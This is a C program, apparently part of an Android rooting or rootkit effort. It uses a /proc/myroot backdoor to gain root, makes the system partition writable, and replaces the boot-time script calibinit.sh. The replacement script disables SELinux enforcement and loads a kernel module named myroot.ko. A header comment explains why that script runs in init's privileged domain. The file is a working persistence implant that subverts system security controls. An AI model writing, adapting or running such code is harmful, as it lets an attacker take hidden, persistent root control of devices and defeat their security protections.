/* Every service without a seclabel line runs in the init domain, and the domain is
 * chosen by the FILE's label, not by the service. kinitlog.sh ran as kinitlog:s0
 * because /system/bin/kinitlog.sh carries u:object_r:kinitlog_exec:s0. calibinit.sh
 * has no file_contexts entry at all, so it stays in the init domain, which is the
 * domain that can load modules and write /sys.
 *
 *     service calibinit /system/bin/calibinit.sh
 *         class main
 *         oneshot
 *
 * class main + no disabled => started at boot, as root, in init's own domain.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/ioctl.h>
#include <linux/fs.h>
static FILE *o;
static int be_root(void){int f=open("/proc/myroot",O_WRONLY);if(f<0)return -1;
 ssize_t w=write(f,"1",1);close(f);return w==1?0:-1;}
int main(void){
    o=fopen("/data/local/tmp/hook5.txt","w"); if(!o)o=stdout;
    if(be_root()!=0){fprintf(o,"no root\n");fclose(o);return 1;}
    int b=open("/dev/block/platform/soc.1/by-name/system",O_RDWR);
    if(b<0){fprintf(o,"open: %s\n",strerror(errno));fclose(o);return 1;}
    ioctl(b,BLKROSET,&(int){0});
    if(mount(NULL,"/system",NULL,MS_REMOUNT,NULL)!=0){
        fprintf(o,"remount: %s\n",strerror(errno));close(b);fclose(o);return 1;}
    fprintf(o,"/system rw\n");

    /* keep the original */
    { int in=open("/system/bin/calibinit.sh",O_RDONLY);
      if(in>=0){ char buf[4096]; ssize_t n=read(in,buf,sizeof buf);
        if(n>0){ int out=open("/system/lib/modules/calibinit.sh.orig",O_CREAT|O_TRUNC|O_WRONLY,0644);
                 if(out>=0){ write(out,buf,n); close(out); } }
        close(in);
        fprintf(o,"  original saved\n"); } }

    /* the payload: drop enforcing, then load the module with the static loader */
    const char *sh =
        "#!/system/bin/sh\n"
        "echo 0 > /sys/fs/selinux/enforce\n"
        "/system/lib/modules/rootload /system/lib/modules/myroot.ko\n"
        "echo 1 > /proc/myroot\n"
        "exit 0\n";
    int f=open("/system/bin/calibinit.sh",O_CREAT|O_TRUNC|O_WRONLY,0755);
    if(f<0) fprintf(o,"  write: %s\n",strerror(errno));
    else { write(f,sh,strlen(sh)); close(f); chmod("/system/bin/calibinit.sh",0755);
           fprintf(o,"  wrote calibinit.sh (%zu bytes)\n",strlen(sh)); }
    struct stat st;
    if(stat("/system/bin/calibinit.sh",&st)==0)
        fprintf(o,"  verify %lld bytes\n",(long long)st.st_size);
    sync();
    ioctl(b,BLKROSET,&(int){1});
    mount(NULL,"/system",NULL,MS_REMOUNT|MS_RDONLY,NULL);
    fprintf(o,"/system ro\n");
    close(b); fclose(o); return 0;
}
